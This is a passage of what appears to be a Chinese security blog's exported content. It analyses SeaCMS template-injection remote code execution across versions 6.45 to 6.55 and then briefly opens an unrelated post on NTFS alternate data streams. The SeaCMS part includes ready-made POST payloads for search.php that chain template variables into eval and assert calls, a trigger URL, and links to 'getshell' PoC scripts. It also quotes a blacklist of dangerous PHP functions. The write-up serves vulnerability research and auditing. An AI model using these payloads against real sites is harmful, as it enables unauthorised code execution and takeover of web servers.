&#123;<span class=\"hljs-attr\">if:</span>\"&#123;<span class=\"hljs-attr\">searchpage:ordername</span>&#125;\"==<span class=\"hljs-string\">\"score\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"ordergold\"</span>&gt;</span>评分最高<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>可以看到，模板文件中有3次出现 ordername，这也就可以解释为什么 payload 触发漏洞之后，执行了三次 phpifno()</p>\n<p>结合我们的 payload，我们可以知道模板文件替换位置最终的形式如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-time-link&#125;\"</span> &#123;<span class=\"hljs-attr\">if:</span>\"&#125;&#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125;&#123;<span class=\"hljs-attr\">if:1</span>)<span class=\"hljs-attr\">phpinfo</span>();<span class=\"hljs-attr\">if</span>(<span class=\"hljs-attr\">1</span>&#125;&#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125;\"==<span class=\"hljs-string\">\"time\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"orderhits\"</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>这里的 <code>}</code>,作用就是在 eval 的时候保证逻辑与语法的正确性，保证之后的代码可以被正确执行。</p>\n<p>模板文件内容替换后，进入到最最关键的一步：</p>\n<p><code>$content=$mainClassObj-&gt;parseIf($content);</code></p>\n<p>跟进到 parseIf 函数：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">parseIf</span><span class=\"hljs-params\">($content)</span></span>&#123;<br>\t\t<span class=\"hljs-keyword\">if</span> (strpos($content,<span class=\"hljs-string\">'&#123;if:'</span>)=== <span class=\"hljs-keyword\">false</span>)&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> $content;<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t<span class=\"hljs-comment\">// echo $content;</span><br>\t\t$labelRule = buildregx(<span class=\"hljs-string\">\"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;\"</span>,<span class=\"hljs-string\">\"is\"</span>);<br>\t\t$labelRule2=<span class=\"hljs-string\">\"&#123;elseif\"</span>;<br>\t\t$labelRule3=<span class=\"hljs-string\">\"&#123;else&#125;\"</span>;<br>\t\tpreg_match_all($labelRule,$content,$iar);<br>\t\t$arlen=count($iar[<span class=\"hljs-number\">0</span>]);<br>\t\t<span class=\"hljs-comment\">// var_dump($iar[0]);</span><br>\t\t$elseIfFlag=<span class=\"hljs-keyword\">false</span>;<br>\t\t<span class=\"hljs-keyword\">for</span>($m=<span class=\"hljs-number\">0</span>;$m&lt;$arlen;$m++)&#123;<br>\t\t\t$strIf=$iar[<span class=\"hljs-number\">1</span>][$m];<br>\t\t\t$strIf=<span class=\"hljs-keyword\">$this</span>-&gt;parseStrIf($strIf);<br>\t\t\t$strThen=$iar[<span class=\"hljs-number\">2</span>][$m];<br>\t\t\t$strThen=<span class=\"hljs-keyword\">$this</span>-&gt;parseSubIf($strThen);<br>\t\t\t<span class=\"hljs-keyword\">if</span> (strpos($strThen,$labelRule2)===<span class=\"hljs-keyword\">false</span>)&#123;<br>\t\t\t\t<span class=\"hljs-keyword\">if</span> (strpos($strThen,$labelRule3)&gt;=<span class=\"hljs-number\">0</span>)&#123;<br>\t\t\t\t\t$elsearray=explode($labelRule3,$strThen);<br>\t\t\t\t\t$strThen1=$elsearray[<span class=\"hljs-number\">0</span>];<br>\t\t\t\t\t$strElse1=$elsearray[<span class=\"hljs-number\">1</span>];<br>\t\t\t\t\t@<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"if(\"</span>.$strIf.<span class=\"hljs-string\">\")&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;\"</span>);<br></code></pre></td></tr></table></figure>\n\n<p>由正则式可知 $iar[0] 数组得到的是所有满足 <code>{if:【内容】}【内容】{end if}</code> 这种形式的匹配结果</p>\n<p>回头来看看我们刚刚替换后的关键部分的模板内容：</p>\n<p><code>&lt;a href=&quot;{searchpage:order-time-link}&quot; {if:&quot;}{end if}{if:1)phpinfo();if(1}{end if}&quot;==&quot;time&quot;}</code></p>\n<p>是满足匹配规则的，重要内容保存在 $iar[1]中。这里我们直接定位到最终执行 payload 的语句中。</p>\n<p><code>@eval(&quot;if(&quot;.$strIf.&quot;){\\$ifFlag=true;}else{\\$ifFlag=false;}&quot;);</code></p>\n<p>跟踪 $strIf 变量，经过了两次处理</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">$strIf=$iar[<span class=\"hljs-number\">1</span>][$m];<br>$strIf=<span class=\"hljs-keyword\">$this</span>-&gt;parseStrIf($strIf);<br></code></pre></td></tr></table></figure>\n\n<p>上面说过，最终的 payload 关键内容会保存在 $iar[1] 中，所以经过 for 遍历，$strIf 一定可以被赋值为带有 phpinfo() 的字符串。</p>\n<p>跟进到 parseStrIf() 函数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">parseStrIf</span><span class=\"hljs-params\">($strIf)</span><br></span>&#123;<br>\t<span class=\"hljs-keyword\">if</span>(strpos($strIf,<span class=\"hljs-string\">'='</span>)===<span class=\"hljs-keyword\">false</span>)<br>\t&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> $strIf;<br>\t&#125;<br>\t<span class=\"hljs-keyword\">if</span>((strpos($strIf,<span class=\"hljs-string\">'=='</span>)===<span class=\"hljs-keyword\">false</span>)&amp;&amp;(strpos($strIf,<span class=\"hljs-string\">'='</span>)&gt;<span class=\"hljs-number\">0</span>))<br>\t&#123;<br>\t\t$strIf=str_replace(<span class=\"hljs-string\">'='</span>, <span class=\"hljs-string\">'=='</span>, $strIf);<br>\t&#125;<br>\t$strIfArr =  explode(<span class=\"hljs-string\">'=='</span>,$strIf);<br>\t<span class=\"hljs-keyword\">return</span> (<span class=\"hljs-keyword\">empty</span>($strIfArr[<span class=\"hljs-number\">0</span>])?<span class=\"hljs-string\">'NULL'</span>:$strIfArr[<span class=\"hljs-number\">0</span>]).<span class=\"hljs-string\">\"==\"</span>.(<span class=\"hljs-keyword\">empty</span>($strIfArr[<span class=\"hljs-number\">1</span>])?<span class=\"hljs-string\">'NULL'</span>:$strIfArr[<span class=\"hljs-number\">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>当下我们的 $strIf 为 <code>1)phpinfo();if(1</code></p>\n<p>其中没有 <strong>=</strong> ，所以直接返回原内容。所以最后 eval() 函数执行的内容就为</p>\n<p><code>@eval(&quot;if(1)phpinfo();if(1){\\$ifFlag=true;}else{\\$ifFlag=false;}&quot;);</code></p>\n<p>代码就会顺利得到执行。</p>\n<p>这里纠正一下引用文章的一个说法，<code>$labelRule = buildregx(&quot;{if:(.*?)}(.*?){end if}&quot;,&quot;is&quot;);</code></p>\n<p>这个正则式并不是贪婪匹配，而是使用  <strong>？</strong> 来取消了贪婪匹配。每次只匹配一个结果，并不向后延伸，而匹配到所有结果是函数 <strong>preg_match_all()</strong> 的作用。</p>\n<h4 id=\"1-2-结果分析\"><a href=\"#1-2-结果分析\" class=\"headerlink\" title=\"1.2 结果分析\"></a>1.2 结果分析</h4><p>这个漏洞利用的十分巧妙。先利用可控变量替换模板中的内容，然后进行模板内容提取，最后正则匹配执行代码。但是说到底，挖掘漏洞的人肯定也是从 eval() 这个危险函数出发，逐步回退，找到可控参数，然后一步步的构造payload，这是典型的一个白盒挖掘漏洞的思路，<code>回溯参数</code>的方法。</p>\n<p>但是 php7 版本以上此漏洞却不能利用，原因是之前匹配到的 <code>&quot;</code> 使得 eval() 函数不能正确执行，导致后面的代码停止执行。</p>\n<p>测试代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>$test = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-string\">'\"'</span>,<span class=\"hljs-string\">\"1)phpinfo();if(1\"</span>);<br><span class=\"hljs-keyword\">for</span> ($i=<span class=\"hljs-number\">0</span>;$i&lt;<span class=\"hljs-number\">5</span>;$i++)&#123;<br>    @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"if(\"</span>.$test[$i].<span class=\"hljs-string\">\") &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\"</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>php5 下的执行结果</p>\n<p>  <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt></p>\n<p>php7 下的执行结果</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt></p>\n<p>可以看出，单从 eval() 函数的使用上来说，php7 对于语法的正确性要求更加严格。</p>\n<h3 id=\"2、v-6-5-4-前台-getshell\"><a href=\"#2、v-6-5-4-前台-getshell\" class=\"headerlink\" title=\"2、v_6.5.4 前台 getshell\"></a>2、v_6.5.4 前台 getshell</h3><p>在这个版本的代码中，将上面讲到的 <strong>$order</strong> 变量也进行了特殊字符的检测 </p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6\"></p>\n<p>跟进到 RemoveXSS 函数里面，可以看出是一个基于黑名单的 xss 关键字过滤的方法。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">RemoveXSS</span><span class=\"hljs-params\">($val)</span> </span>&#123;  <br><br>   $val = preg_replace(<span class=\"hljs-string\">'/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/'</span>, <span class=\"hljs-string\">''</span>, $val);  <br>  <br>   $search = <span class=\"hljs-string\">'abcdefghijklmnopqrstuvwxyz'</span>; <br>   $search .= <span class=\"hljs-string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;  <br>   $search .= <span class=\"hljs-string\">'1234567890!@#$%^&amp;*()'</span>; <br>   $search .= <span class=\"hljs-string\">'~`\";:?+/=&#123;&#125;[]-_|\\'\\\\'</span>; <br>   <span class=\"hljs-keyword\">for</span> ($i = <span class=\"hljs-number\">0</span>; $i &lt; strlen($search); $i++) &#123; <br> <br>      $val = preg_replace(<span class=\"hljs-string\">'/(&amp;#[xX]0&#123;0,8&#125;'</span>.dechex(ord($search[$i])).<span class=\"hljs-string\">';?)/i'</span>, $search[$i], $val); <br>      $val = preg_replace(<span class=\"hljs-string\">'/(&amp;#0&#123;0,8&#125;'</span>.ord($search[$i]).<span class=\"hljs-string\">';?)/'</span>, $search[$i], $val); <span class=\"hljs-comment\">// with a ; </span><br>   &#125; <br>   <br>   $ra1 = <span class=\"hljs-keyword\">Array</span>(<span class=\"hljs-string\">'_GET'</span>,<span class=\"hljs-string\">'_POST'</span>,<span class=\"hljs-string\">'_COOKIE'</span>,<span class=\"hljs-string\">'_REQUEST'</span>,<span class=\"hljs-string\">'if:'</span>,<span class=\"hljs-string\">'javascript'</span>, <span class=\"hljs-string\">'vbscript'</span>, <span class=\"hljs-string\">'expression'</span>, <span class=\"hljs-string\">'applet'</span>, <span class=\"hljs-string\">'meta'</span>, <span class=\"hljs-string\">'xml'</span>, <span class=\"hljs-string\">'blink'</span>, <span class=\"hljs-string\">'link'</span>, <span class=\"hljs-string\">'style'</span>, <span class=\"hljs-string\">'script'</span>, <span class=\"hljs-string\">'embed'</span>, <span class=\"hljs-string\">'object'</span>, <span class=\"hljs-string\">'iframe'</span>, <span class=\"hljs-string\">'frame'</span>, <span class=\"hljs-string\">'frameset'</span>, <span class=\"hljs-string\">'ilayer'</span>, <span class=\"hljs-string\">'layer'</span>, <span class=\"hljs-string\">'bgsound'</span>, <span class=\"hljs-string\">'title'</span>, <span class=\"hljs-string\">'base'</span>, <span class=\"hljs-string\">'eval'</span>, <span class=\"hljs-string\">'passthru'</span>, <span class=\"hljs-string\">'exec'</span>, <span class=\"hljs-string\">'assert'</span>, <span class=\"hljs-string\">'system'</span>, <span class=\"hljs-string\">'chroot'</span>, <span class=\"hljs-string\">'chgrp'</span>, <span class=\"hljs-string\">'chown'</span>, <span class=\"hljs-string\">'shell_exec'</span>, <span class=\"hljs-string\">'proc_open'</span>, <span class=\"hljs-string\">'ini_restore'</span>, <span class=\"hljs-string\">'dl'</span>, <span class=\"hljs-string\">'readlink'</span>, <span class=\"hljs-string\">'symlink'</span>, <span class=\"hljs-string\">'popen'</span>, <span class=\"hljs-string\">'stream_socket_server'</span>, <span class=\"hljs-string\">'pfsockopen'</span>, <span class=\"hljs-string\">'putenv'</span>, <span class=\"hljs-string\">'cmd'</span>,<span class=\"hljs-string\">'base64_decode'</span>,<span class=\"hljs-string\">'fopen'</span>,<span class=\"hljs-string\">'fputs'</span>,<span class=\"hljs-string\">'replace'</span>,<span class=\"hljs-string\">'input'</span>,<span class=\"hljs-string\">'contents'</span>); <br>   $ra2 = <span class=\"hljs-keyword\">Array</span>(<span class=\"hljs-string\">'onabort'</span>, <span class=\"hljs-string\">'onactivate'</span>, <span class=\"hljs-string\">'onafterprint'</span>, <span class=\"hljs-string\">'onafterupdate'</span>, <span class=\"hljs-string\">'onbeforeactivate'</span>, <span class=\"hljs-string\">'onbeforecopy'</span>, <span class=\"hljs-string\">'onbeforecut'</span>, <span class=\"hljs-string\">'onbeforedeactivate'</span>, <span class=\"hljs-string\">'onbeforeeditfocus'</span>, <span class=\"hljs-string\">'onbeforepaste'</span>, <span class=\"hljs-string\">'onbeforeprint'</span>, <span class=\"hljs-string\">'onbeforeunload'</span>, <span class=\"hljs-string\">'onbeforeupdate'</span>, <span class=\"hljs-string\">'onblur'</span>, <span class=\"hljs-string\">'onbounce'</span>, <span class=\"hljs-string\">'oncellchange'</span>, <span class=\"hljs-string\">'onchange'</span>, <span class=\"hljs-string\">'onclick'</span>, <span class=\"hljs-string\">'oncontextmenu'</span>, <span class=\"hljs-string\">'oncontrolselect'</span>, <span class=\"hljs-string\">'oncopy'</span>, <span class=\"hljs-string\">'oncut'</span>, <span class=\"hljs-string\">'ondataavailable'</span>, <span class=\"hljs-string\">'ondatasetchanged'</span>, <span class=\"hljs-string\">'ondatasetcomplete'</span>, <span class=\"hljs-string\">'ondblclick'</span>, <span class=\"hljs-string\">'ondeactivate'</span>, <span class=\"hljs-string\">'ondrag'</span>, <span class=\"hljs-string\">'ondragend'</span>, <span class=\"hljs-string\">'ondragenter'</span>, <span class=\"hljs-string\">'ondragleave'</span>, <span class=\"hljs-string\">'ondragover'</span>, <span class=\"hljs-string\">'ondragstart'</span>, <span class=\"hljs-string\">'ondrop'</span>, <span class=\"hljs-string\">'onerror'</span>, <span class=\"hljs-string\">'onerrorupdate'</span>, <span class=\"hljs-string\">'onfilterchange'</span>, <span class=\"hljs-string\">'onfinish'</span>, <span class=\"hljs-string\">'onfocus'</span>, <span class=\"hljs-string\">'onfocusin'</span>, <span class=\"hljs-string\">'onfocusout'</span>, <span class=\"hljs-string\">'onhelp'</span>, <span class=\"hljs-string\">'onkeydown'</span>, <span class=\"hljs-string\">'onkeypress'</span>, <span class=\"hljs-string\">'onkeyup'</span>, <span class=\"hljs-string\">'onlayoutcomplete'</span>, <span class=\"hljs-string\">'onload'</span>, <span class=\"hljs-string\">'onlosecapture'</span>, <span class=\"hljs-string\">'onmousedown'</span>, <span class=\"hljs-string\">'onmouseenter'</span>, <span class=\"hljs-string\">'onmouseleave'</span>, <span class=\"hljs-string\">'onmousemove'</span>, <span class=\"hljs-string\">'onmouseout'</span>, <span class=\"hljs-string\">'onmouseover'</span>, <span class=\"hljs-string\">'onmouseup'</span>, <span class=\"hljs-string\">'onmousewheel'</span>, <span class=\"hljs-string\">'onmove'</span>, <span class=\"hljs-string\">'onmoveend'</span>, <span class=\"hljs-string\">'onmovestart'</span>, <span class=\"hljs-string\">'onpaste'</span>, <span class=\"hljs-string\">'onpropertychange'</span>, <span class=\"hljs-string\">'onreadystatechange'</span>, <span class=\"hljs-string\">'onreset'</span>, <span class=\"hljs-string\">'onresize'</span>, <span class=\"hljs-string\">'onresizeend'</span>, <span class=\"hljs-string\">'onresizestart'</span>, <span class=\"hljs-string\">'onrowenter'</span>, <span class=\"hljs-string\">'onrowexit'</span>, <span class=\"hljs-string\">'onrowsdelete'</span>, <span class=\"hljs-string\">'onrowsinserted'</span>, <span class=\"hljs-string\">'onscroll'</span>, <span class=\"hljs-string\">'onselect'</span>, <span class=\"hljs-string\">'onselectionchange'</span>, <span class=\"hljs-string\">'onselectstart'</span>, <span class=\"hljs-string\">'onstart'</span>, <span class=\"hljs-string\">'onstop'</span>, <span class=\"hljs-string\">'onsubmit'</span>, <span class=\"hljs-string\">'onunload'</span>); <br>   $ra = array_merge($ra1, $ra2); <br><br>    ......<br>    <br>   <span class=\"hljs-keyword\">return</span> $val;  <br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>其中，黑名单数组的第一组 $ra1 中的第5项添加了 <code>if:</code> 这个黑名单匹配项，还加了另外其他的几个匹配项</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">'_GET','_POST','_COOKIE','_REQUEST'<br></code></pre></td></tr></table></figure>\n\n<p>所以 v_6.4.5 版本的 payload 会因为逻辑关系的不成立，因此在 eval() 函数中得不到执行。</p>\n<p>那么我们来看看这个版本的脑洞版 payload </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">文件：<br>search.php<br><br>POST 内容：<br>searchtype=<span class=\"hljs-number\">5</span><br>&amp;searchword=&#123;<span class=\"hljs-keyword\">if</span>&#123;searchpage:year&#125;<br>&amp;year=:e&#123;searchpage:area&#125;&#125;<br>&amp;area=v&#123;searchpage:letter&#125;<br>&amp;letter=al&#123;searchpage:lang&#125;<br>&amp;yuyan=(join&#123;searchpage:jq&#125;<br>&amp;jq=($_P&#123;searchpage:ver&#125;<br>&amp;ver=OST[<span class=\"hljs-number\">9</span>]))<br>&amp;<span class=\"hljs-number\">9</span>[]=ph<br>&amp;<span class=\"hljs-number\">9</span>[]=pinfo();<br><br><span class=\"hljs-comment\">// 传递拼接为 ：if:eval(join($_POST[9]))</span><br></code></pre></td></tr></table></figure>\n\n<p>因为每个传入的参数限长为 20，所以我们必须尽可能多的使用之后会在模板文件中进行替换的变量进行 payload 的构造。</p>\n<p>每一步都会将上一步构造的 payload 进行二次构造，最后传递成为最终等待执行的代码:</p>\n<figure class=\"highlight PHP\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs PHP\"><span class=\"hljs-keyword\">if</span>:<span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))<br></code></pre></td></tr></table></figure>\n\n<p>由上一个版本的数据流向，依旧会通过 <strong>parseIf()</strong> 函数，那么最终 eval() 执行恶意函数。这里有两个疑点需要解释。</p>\n<ul>\n<li><p>为了防止在 <strong>parseIf</strong> 里面的 eval() 中的 if 语句逻辑错误而不能正常执行，这里构造了 eval(eval(【】)）的结构，使得因为解析顺序，<strong>$_POST</strong> 传来的值会直接进行解释执行。</p>\n</li>\n<li><p>这里只执行了一次 phpinfo() 函数就是第一次替换执行的，第一次的完整的正则匹配如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">&#123;<span class=\"hljs-keyword\">if</span>:<span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))&#125;,海洋CMS<span class=\"hljs-string\">\" /&gt;<br>&lt;meta name=\"</span>description<span class=\"hljs-string\">\" content=\"</span>&#123;<span class=\"hljs-keyword\">if</span>:<span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))&#125;,海洋CMS<span class=\"hljs-string\">\" /&gt;<br>&lt;meta http-equiv=\"</span>Content-Type<span class=\"hljs-string\">\" content=\"</span>text/html; charset=utf<span class=\"hljs-number\">-8</span><span class=\"hljs-string\">\"&gt;<br>//省略大部分内容<br>&#123;end if&#125;</span><br></code></pre></td></tr></table></figure>\n\n<p>由正则匹配和 eval() 函数执行的语句知，最后的执行语句为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">@<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"if(\"</span><span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))<span class=\"hljs-string\">\")&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;\"</span>);<br></code></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<h4 id=\"￥思路分析\"><a href=\"#￥思路分析\" class=\"headerlink\" title=\"￥思路分析\"></a>￥思路分析</h4><p>如果我们在首次拿到这个系统的代码时，想要找到上面这种利用方式是不太容易的。整个利用思路最最值得借鉴的就是按照 php 的解析顺序，替换顺序来构造 payload ，让多次替换后的 payload 成为最终的 payload。的确骚~</p>\n<h3 id=\"3、v6-5-5-前台-getshell\"><a href=\"#3、v6-5-5-前台-getshell\" class=\"headerlink\" title=\"3、v6.5.5 前台 getshell\"></a>3、v6.5.5 前台 getshell</h3><p>这一版的系统在 parseIf 函数里面进行了危险函数,参数的过滤，但是忽略了 assert 和 $SERVER[‘QUERY_STRING’]。构造方法同上一版，payload 如下。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">文件：<br>search.php<br><br>POST 内容：<br>searchtype=<span class=\"hljs-number\">5</span><br>&amp;searchword=&#123;<span class=\"hljs-keyword\">if</span>&#123;searchpage:year&#125;<br>&amp;year=:<span class=\"hljs-keyword\">as</span>&#123;searchpage:area&#125;&#125;<br>&amp;area=s&#123;searchpage:letter&#125;<br>&amp;letter=ert&#123;searchpage:lang&#125;<br>&amp;yuyan=($_SE&#123;searchpage:jq&#125;<br>&amp;jq=RVER&#123;searchpage:ver&#125;<br>&amp;ver=[QUERY_STRING]));<br></code></pre></td></tr></table></figure>\n\n<p>访问如下的 url 即可触发</p>\n<p><code>http://IP/search.php?phpinfo</code></p>\n<p>post 内容如上。</p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3@ 总结\"></a>3@ 总结</h2><p>可以看见，这款 cms 的修复方法多次使用了黑名单，单独应用在这种场景下还是不容易做出良好的防御。</p>\n<p>poc 脚本链接如下：</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">v_6.<span class=\"hljs-number\">4.5</span>: http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/<span class=\"hljs-number\">59</span>lx/auidt_poc/blob/master/seacms_poc_6.<span class=\"hljs-number\">45</span>_getshell.<span class=\"hljs-keyword\">py</span><br>v_6.<span class=\"hljs-number\">5.4</span>: http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/<span class=\"hljs-number\">59</span>lx/auidt_poc/blob/master/seacms_poc_6.<span class=\"hljs-number\">5</span>_getshell.<span class=\"hljs-keyword\">py</span><br>v_6.<span class=\"hljs-number\">5.5</span>: http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/<span class=\"hljs-number\">59</span>lx/auidt_poc/blob/master/seacms_poc_6.<span class=\"hljs-number\">5</span>_getshell.<span class=\"hljs-keyword\">py</span><br></code></pre></td></tr></table></figure>\n\n"},{"title":"ntfs 文件系统中的供选数据流","date":"2019-08-16T16:00:00.000Z","_content":"\n\n## 1@ 前言\n\n前几天在审计 seacms 的时候碰到了一个问题十分有趣。上图说话：\n\n ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/1.png)\n\n\n\n ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/2.png)\n\n上两图反映的问题就是在 windows 系统中，一个文件名中存在 `:` 的文件，在文件夹是看不到冒号后面完整的文件名的，但是这个文件的的确确存在，而且文件内容也可以成功的写入，亦或是读取。\n\n在思索无果后，上小密圈提问得到了 wonderkun 师傅的指点，在 ll 的指引下，学习了一下ntfs 